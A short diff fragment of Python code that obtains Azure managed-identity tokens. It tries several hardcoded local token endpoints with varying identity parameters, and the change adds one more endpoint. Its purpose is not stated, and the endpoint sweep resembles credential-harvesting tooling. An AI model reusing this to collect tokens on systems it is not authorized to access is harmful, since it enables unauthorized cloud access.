@@ -48,7 +48,7 @@ def tok(resource):
  ep=e.get("IDENTITY_ENDPOINT") or e.get("MSI_ENDPOINT"); hd={}
  if e.get("IDENTITY_HEADER"):hd["X-IDENTITY-HEADER"]=e["IDENTITY_HEADER"]
  if e.get("MSI_SECRET"):hd["Secret"]=e["MSI_SECRET"]
- eps=[x for x in [ep,"http://127.0.0.1:41741/MSI/token","http://127.0.0.1:8081/msi/token","http://169.254.131.3:8081/msi/token"] if x]
+ eps=[x for x in [ep,"http://127.0.0.1:41741/MSI/token","http://127.0.0.1:8081/msi/token","http://169.254.131.3:8081/msi/token","http://169.254.131.12:8081/msi/token"] if x]
  for x in eps:
   for q in ("&client_id="+CLIENT,"&mi_res_id="+urllib.parse.quote(MIRES,safe=""),""):
    try:
